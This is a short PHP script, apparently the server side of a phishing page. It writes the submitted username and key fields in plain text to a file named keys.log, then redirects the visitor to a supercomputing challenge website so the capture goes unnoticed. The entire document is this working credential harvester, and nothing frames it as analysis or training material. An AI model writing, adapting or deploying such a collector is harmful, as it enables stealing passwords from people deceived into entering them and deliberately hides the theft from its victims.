<?PHP 
$info = "$_POST[username],$_POST[key]\n";
file_put_contents("keys.log", $info, FILE_APPEND);

header("Location: http://supercomputingchallenge.org/19-20");
exit;
?>

